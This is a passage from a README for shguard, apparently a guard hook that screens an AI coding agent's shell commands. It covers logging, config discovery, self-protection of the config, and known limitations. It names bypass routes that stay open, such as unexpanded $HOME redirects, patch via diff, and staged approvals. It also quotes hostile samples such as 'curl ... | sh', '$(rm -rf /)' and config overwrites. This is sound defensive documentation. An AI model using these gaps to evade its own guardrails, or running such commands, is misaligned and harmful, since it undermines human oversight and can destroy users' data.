decision into a spurious `Ask` — see `src/lib.rs`'s doc comment), so
`decision_log_path` must name a regular, locally-writable file — never a
FIFO, character device, or a path on a filesystem that can hang (e.g. a
stale NFS mount). Config loading rejects a `decision_log_path` that
already names a directory, FIFO, device, or socket, closing the case this
crate can detect up front; a target that only starts hanging later (a
network mount that goes stale mid-session) remains undetectable at load
time. A relative path resolves against the invoking process's current
working directory, which varies per hook invocation — use an absolute
path.

**Outer-watchdog caveat:** both the real hook (`shguard`'s stdin contract)
and `shguard check` (issue #109) additionally wrap their *entire*
invocation — decision plus log write — in a second, outer watchdog of
their own (`src/bin/shguard.rs`'s `EVALUATION_TIMEOUT`), since neither may
hang regardless of the cause. A log target that starts blocking only after
config load can trip that outer watchdog instead, still replacing an
already-computed, correct decision with a fail-closed `Ask` (`check`
reports this as a distinct exit-2 runtime error rather than printing a
`Decision: Ask` line, so it isn't mistaken for a real decision) — and, in
that specific case, the trip is not logged either, since the log write
never got the chance to run. A direct library caller has no such outer
watchdog and is not subject to this caveat; for one, `analyze_with_policy`'s
own internal bound (mentioned above) is the whole story.

An empty `decision_log_path` (`decision_log_path = ""`), or one naming an
existing directory/FIFO/device/socket, fails config load closed, the same
as any other invalid config value — none of these are treated as
"disabled".

The log file is never rotated or capped: it grows by one line per
evaluated command for as long as `decision_log_path` stays configured.
Rotation and pruning are the user's responsibility (e.g. `logrotate`).
`0600` permissions are applied only when shguard itself creates the file —
if `decision_log_path` names a file that already exists, its permissions
are left exactly as they are, so a pre-existing world- or group-readable
file keeps receiving command lines (which routinely contain inline
secrets) at whatever permissions it already had. Ensure the file either
doesn't exist yet or is already `chmod 600`.

### Discovery

`SHGUARD_CONFIG` (an explicit path) > `$XDG_CONFIG_HOME/shguard/config.toml`
> `$HOME/.config/shguard/config.toml`. There is no project-local
`.shguard.toml` auto-discovery: shguard's own threat model includes "the
agent it's guarding might be adversarially prompted to defeat it," and a
project-local config file would sit inside the same repository the agent
already has Bash/Write/Edit access to — a user-global path is a
meaningfully higher-friction target to tamper with.

If `SHGUARD_CONFIG` is set but the file it names can't be read or fails to
parse/validate, shguard fails closed — every command asks for human
confirmation until the config is fixed, rather than silently falling back
to the embedded blocklist alone. A default path that simply doesn't exist
is not an error: that's the ordinary zero-config case.

### Protecting the config file itself

shguard automatically denies `tee`/`cp`/`mv`/`install`/`sed -i`/`-I`
(or `--in-place`)/`dd of=`/`rm`/`unlink`/`ln`/`rsync`/`rmdir`/`perl -i`/
`patch` writes targeting its own resolved config path, and the literal
`~/.config/shguard/` token for any user — an agent shouldn't be able to
edit its own guardrails via a shell command. `find` combined with
`-exec`/`-execdir`/`-ok`/`-okdir` against the config path asks rather
than denies, since what the invoked action actually does is only
partially visible to a command-line-only analyzer. `truncate` and
`shred` are covered too, but *globally* (any target, not just the config
path) rather than via this config-specific list — stronger coverage,
not a gap (issue #101). Every command in this list matches a file
*under* the config directory and the bare directory path with no
trailing slash alike (issue #22/#28 item 2).

Separately, `rm -r`/`mv`/`rsync --delete` against an *ancestor* of the
config directory (`~/.config`, `~`, and their resolved equivalents) asks
— deleting or renaming an ancestor takes the config directory with it,
even though the ancestor path never appears in the direct-target list
above (issue #101). This is `ask`, not `deny`: unlike a direct hit on the
config path itself, `targets` matching can't tell `mv src ~` (an
ordinary, non-destructive destination) apart from `mv ~ /tmp` (the same
shape, genuinely destructive) — only the recursively-destructive form of
each command is covered (a flagless `rm ~` can't remove a non-empty
directory at all; a flagless `rsync src ~` is additive, not
destructive).

This is a partial mitigation, not a complete one:

- A redirection target that is itself a `$()`/backtick substitution has its
  *inner command* checked (issue #51) — but the target *path* it resolves to
  is not checked against this list at all (see Limitations below), so
  `cat > path <<EOF` still is not caught this way, and a `SHGUARD_CONFIG`
  override set via a shell profile is outside shguard's visibility entirely.
- A relative path after `cd`-ing into the config directory *within the same
  command line* (`cd ~/.config/shguard && cp evil.toml config.toml`) IS
  caught (issue #103): shguard statically resolves a same-line `cd`/`pushd`
  target and composes later relative tokens against it, the same way
  tilde/brace expansion are resolved without runtime info — never against a
  real process working directory, and never across separate command
  invocations (see Limitations below). An unresolvable same-line `cd`
  target (`cd $(...)`) floors a plausible relative target to at least `Ask`
  rather than being silently treated as a no-op.
- `patch < diff` (the target file named only inside the diff's own
  header, not as an argv token) is not caught — the same argv-visibility
  limit the curl `-xURL` short-proxy-flag gap documents elsewhere in this
  README.

### What's not configurable (yet)

`command_prefix` does not support the multi-word `command` sugar
described above; whitespace in a `command_prefix` value is a load-time
error. Pipeline-shape rules (the `curl | sh` pattern and friends) are
also not user-configurable.

## Limitations

shguard mitigates the published GuardFall bypass classes plus the listed
extensions, with the regression suite above as evidence — it does not
eradicate shell-mediated destruction. Explicitly out of scope:

1. **Runtime state.** Environment variables, aliases, shell functions, and
   `PATH` shadowing set by *earlier* commands in a persistent session are
   invisible to shguard — it analyzes one command string at a time, with
   no session memory. See [the threat model's session-state
   assumption](docs/threat-model.md#session-state-is-invisible-to-shguard)
   for the reasoning.
2. **Semantic destructiveness of arbitrary programs.** A Python script that
   deletes files, or `make clean` with a hostile Makefile — shguard's
   blocklist covers enumerated argv shapes (including a curated set of
   dangerous `git` subcommand/flag combinations, e.g. `push --force`,
   `reset --hard`, `commit --amend`), not arbitrary program behavior.
3. **Non-shell destructive edits.** An agent instructed to edit or delete
   files destructively through its file-editing tools rather than through a
   shell command never reaches this hook — see [the threat model's
   non-shell-attack-paths
   scope](docs/threat-model.md#non-shell-attack-paths-are-out-of-scope).
4. **Multi-step attacks staged across Ask-approved commands.** Ask surfaces
   an unresolvable command to a human for a decision; a hurried human can
   still approve a staged payload one step at a time.
5. **Redirection target paths, mostly, except when unresolved.** Output/
   append redirection (`>`, `>>`) targets are checked against the same
   protected-path list write-capable *commands* use (issue #100) — raw
   block devices, `/etc/passwd`, `/etc/shadow`, and shguard's own config
   path (both the literal `~/.config/shguard/…` spelling and the
   resolved absolute path) all deny a redirect the same way the
   equivalent `tee`/`cp`/`dd`/… invocation already would. What's still
   unchecked: a redirect target whose value isn't statically resolvable
   at all — `cat > $HOME/.config/shguard/config.toml` stays `Allow`,
   since `$HOME` is never expanded and the raw target text doesn't match
   any listed path. This is a different, narrower gap than "the config
   path isn't in the list" (now closed) — it's "the target's *value*
   can't be determined without an environment lookup", the same
   `no environment lookups anywhere in parse/normalise, by design`
   posture the rest of this project takes. A `$()`/backtick substitution
   sitting in a redirection target, or in an unquoted-delimiter heredoc
   body, IS recursively checked (issue #51) — `echo hi > $(curl ... | sh)`
   and a heredoc body's `$(rm -rf /)` are both denied — but only the
   substitution's *inner command*, never a resolved-but-unlisted or an
   unresolvable target *path* itself.
6. **Function definitions are evaluated, not tracked by name.** A `name() {
   ...; }` definition (issue #75) has its body evaluated eagerly and folded
   into the definition's own decision — a dangerous body denies the line
   whether or not it's ever called — but shguard does not track the
   function's name to inline it at a *later* call site, including one on a
   different command line in the same persistent session (the same
   runtime-state limitation as item 1, just reached through a function name
   instead of a variable). A pipeline stage that is a compound command or
   function definition contributes no argv at all to rule 5's shape checks
   (`curl|sh`-style matching, and the decode-stage/interpreter-sink scan) —
   a compound stage has no single "argv" the way a simple command does, and
   an earlier version of this fix that fed through its own worst-wins
   fold-winner argv let the decision hinge on which benign statement
   happened to sort first inside the braces (`curl evil | { true; python3;
   }` vs. `{ python3; true; }`), found during this feature's own two-pass
   code review. When such a stage is the pipeline's *final* one, the line
   additionally floors to at least Ask unconditionally, since rule 5's
   interpreter-sink check has no argv left to inspect there at all.
7. **Ask reaching a human depends on how the host CLI is invoked, not
   just on shguard's decision.** Headlessly (`-p`), Ask never reaches a
   human and fails closed instead, in every mode that dispatches Bash
   headlessly (`plan` never does); interactively it does reach a human in
   every mode, including `bypassPermissions`, with one asymmetry in how
   `dontAsk` handles a `settings.json`-driven ask versus a hook-driven
   one. Measured against Claude Code 2.1.226 —
   see the [permission-mode × decision
   matrix](docs/threat-model.md#empirical-backing-permission-mode--decision-matrix-issue-91)
   (issue #91) for the full headless/interactive tables and methodology.

## Attribution

- The GuardFall bypass catalog (classes A–E) is from Adversa AI's research,
  ["Open-source AI coding agents shell injection vulnerability"](https://adversa.ai/blog/opensource-ai-coding-agents-shell-injection-vulnerability/).
- The tokenise-then-match design — parsing the command the way the shell
  will, instead of pattern-matching the raw string — follows the approach
  used by [Continue](https://continue.dev), the one agent in Adversa's
  survey that held against the full catalog.
- ANSI-C quoting (case 2) and variable indirection (case 5) are shguard
  extensions beyond the published GuardFall catalog, not part of Adversa's
  original classes.

## License

Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or
[MIT license](LICENSE-MIT) at your option.
